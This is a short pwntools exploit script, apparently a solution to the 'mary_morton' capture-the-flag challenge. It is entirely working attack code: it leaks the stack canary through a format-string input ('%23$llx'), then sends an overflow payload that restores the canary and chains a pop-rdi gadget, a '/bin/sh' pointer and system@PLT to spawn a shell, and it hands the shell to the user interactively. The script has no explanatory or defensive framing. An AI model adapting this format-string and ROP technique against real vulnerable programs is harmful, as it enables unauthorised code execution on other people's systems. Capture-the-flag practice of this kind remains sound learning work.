from pwn import *

target = process('./mary_morton')
# gdb.attach(target, gdbscript="b *0x4009a5")
raw_input()

system = 0x4006a0   # system@PLT
pop_rdi_ret = 0x400ab3
bin_sh = 0x400b2b    # pointer to "/bin/sh" string in program's memory


target.recvuntil("Exit the battle")
target.sendline("2")
# target.recvline()
target.sendline("%23$llx")
target.recvline()
canary = target.recvline()
canary = int(canary, 16)
print("canary: " + hex(canary))
target.recvuntil("Exit the battle")
# target.interactive()

target.sendline("1")
payload = 136 * b"0"
payload += p64(canary)
payload += 8 * b"1"
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(system)

target.send(payload)
target.interactive()
